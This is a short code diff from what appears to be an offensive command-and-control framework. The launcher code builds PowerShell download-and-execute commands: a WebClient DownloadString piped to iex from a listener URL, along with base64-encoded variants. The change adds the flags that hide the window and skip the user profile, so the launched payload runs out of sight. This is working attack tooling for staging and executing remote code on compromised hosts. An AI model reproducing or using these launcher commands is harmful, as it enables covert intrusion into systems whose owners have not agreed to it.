@@ -108,14 +108,14 @@ namespace Commander.Commands.Laucher
                 string caller = $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
                 if (listener.Secured)
                     caller = BuildDropperCommand.PowershellSSlScript + caller;
-                context.Terminal.WriteLine($"[>] Command : powershell -c \"{caller}\"");
+                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{caller}\"");
                 string caller64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(caller));
-                context.Terminal.WriteLine($"[>] Command : powershell -enc {caller64}");
+                context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {caller64}");
             }
 
             context.Terminal.WriteLine($"[+] Direct Script : ");
-            context.Terminal.WriteLine($"[>] Command : powershell -c \"{script}\"");
-            context.Terminal.WriteLine($"[>] Command : powershell -enc {scriptb64}");
+            context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -c \"{script}\"");
+            context.Terminal.WriteLine($"[>] Command : powershell -noP -sta -w 1 -enc {scriptb64}");
 
             return true;
         }
